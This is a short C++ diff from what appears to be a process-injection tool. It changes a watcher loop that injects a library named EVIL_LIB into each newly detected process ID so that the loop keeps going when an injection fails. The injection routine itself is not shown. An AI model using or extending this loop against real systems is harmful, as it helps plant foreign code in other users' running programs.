@@ -54,9 +54,7 @@ int main(int argc, char *argv[]) {
 		for (auto pid: watcher.new_pids()) {
 			std::cout << "found new pid '" << pid << "'" << std::endl
 				<< "trying to inject " << EVIL_LIB << std::endl;
-			if (auto err = maybe_inject(pid, EVIL_LIB); err) {
-				return err;
-			}
+			maybe_inject(pid, EVIL_LIB);
 		}
 		std::this_thread::sleep_for(std::chrono::seconds(1));
 	}
